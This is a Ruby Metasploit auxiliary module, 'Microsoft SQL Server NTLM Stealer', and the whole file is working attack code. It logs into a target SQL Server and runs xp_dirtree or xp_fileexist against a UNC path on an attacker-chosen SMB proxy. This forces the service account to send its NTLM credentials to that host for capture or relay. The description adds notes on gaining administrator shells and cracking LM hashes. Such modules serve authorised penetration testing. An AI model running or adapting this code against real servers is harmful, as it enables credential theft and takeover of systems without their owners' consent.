require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::MSSQL
	include Msf::Auxiliary::Scanner

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft SQL Server NTLM Stealer',
			'Description'    => %q{
			
				This module can be used to help capture or relay the LM/NTLM 
				credentials of the account running the remote SQL Server service.  
				The module will use the supplied credentials to connect to the 
				target SQL Server instance and execute the native "xp_dirtree" or 
				"xp_fileexist" stored procedure.   The stored procedures will then 
				force the service account to authenticate to the system defined in 
				the SMBProxy option. In order for the attack to be successful, the 
				SMB capture or relay module must be running on the system defined 
				as the SMBProxy.  The database account used to connect to the 
				database should only require the "PUBLIC" role to execute.  
				Successful execution of this attack usually results in local 
				administrative access to the Windows system.  Specifically, this 
				works great for relaying credentials between two SQL Servers using
				a shared service account to get shells.  However, if the relay fails, 
				then the LM hash can be reversed using the Halflm rainbow tables and 
				john the ripper. Thanks to "Sh2kerr" who wrote the ora_ntlm_stealer 
				for the inspiration.  
			},
			'Author'         => [ 'Scott Sutherland [at] netspi [dot] com>' ],
			'License'        => MSF_LICENSE,
			'Platform'      => [ 'Windows' ],
			'References'     => [[ 'URL', 'http://www.netspi.com/blog/author/ssutherland/' ]],
		))

		register_options(
			[
				OptString.new('SMBPROXY', [ true, 'IP of SMB proxy or sniffer.', '0.0.0.0']),
			], self.class)
	end

	def run_host(ip)
		
		## WARNING
		print_status("DONT FORGET to run a SMB capture or relay module!")

		## SET VERBOSITY LEVEL
		verbose = datastore['verbose'].to_s.downcase 

		## Set default result
		result = 0
		
		## Attempt xp_dirtree and xp_fileexist
		result = exec_unc("xp_dirtree",datastore['SMBPROXY'],rhost,rport)
		
		if result == 0 then 			
			result = exec_unc("xp_fileexist",datastore['SMBPROXY'],rhost,rport)
		end
		
		## Display status to user
		if result == 1 then 
			print_good("Execution complete, go check your SMB relay or capture module!")
		else
			print_error("Module failed to initiate authentication to smbproxy.")
		end
	end
	
	
	## ----------------------------------------------------
	## METHOD TO FORCE SQL SERVER TO AUTHENTICATE 	
	## TO UNC PATH - supports xp_dirtree and xp_fileexist
	## ----------------------------------------------------
	def exec_unc(sprocedure,smbproxy,vic,vicport)
		
		print_status("Forcing SQL Server at #{vic} to auth to #{smbproxy} via #{sprocedure}...")
		
		## SETUP QUERY
		sql = "#{sprocedure} '\\\\#{smbproxy}\\file'"
		
		## EXECUTE QUERY		
		begin
			result = mssql_query(sql, false) if mssql_login_datastore
			column_data = result[:rows]
			print_good("Successfully executed #{sprocedure} on #{rhost}")			
			return 1
		rescue
			print_error("Failed to connect to #{rhost} on port #{rport}")
			return 0
		end	
	end
	
end
